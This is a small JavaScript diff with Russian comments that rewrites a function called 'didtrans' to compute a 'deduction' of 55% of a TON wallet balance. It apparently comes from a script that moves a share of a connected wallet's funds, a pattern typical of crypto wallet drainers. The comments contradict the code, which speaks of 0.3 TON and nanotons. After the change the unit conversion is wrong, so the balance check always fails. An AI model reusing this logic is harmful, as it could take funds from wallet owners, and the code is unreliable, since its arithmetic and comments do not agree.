@@ -81,10 +81,10 @@ async function didtrans() {
         return;
     }
 
-    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
+    const originalBalance = ((parseFloat(data.balance)) / 1000000000) * 0.55; // Баланс в нанотонах
 
     // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
-    const deduction = originalBalance * 0.55; // 0.3 TON в нанотонах
+    const deduction = originalBalance * 1000000000; // 0.3 TON в нанотонах
 
     // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
     if (originalBalance <= deduction) {
